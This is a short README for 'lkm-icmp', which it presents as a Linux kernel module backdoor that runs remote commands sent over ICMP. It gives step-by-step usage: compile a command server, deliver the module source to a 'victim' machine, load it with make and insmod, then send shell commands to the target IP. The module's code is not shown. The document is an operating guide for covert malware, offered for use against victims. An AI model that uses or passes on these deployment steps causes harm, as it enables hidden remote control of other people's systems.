# lkm-icmp

LKM ICMP is a linux kernel module conversion of my previous icmp backdoor made in C, this module provides a lkm backdoor that execute remote commands.

## Usage

First, you need to compile the server to send commands to victim

```bash
gcc server.c -o server -pthread
```

After you have the server, you need to delivery `icmpbackdoor.c` and `Makefile` to victim.

**In victim machine**

```bash
ls
icmpbackdoor.c Makefile

make ; insmod icmpbackdoor.ko
```

Now, to execute commands in victim, use the server

```bash
./server <target-ip>
# cmd
echo test > /tmp/test
```
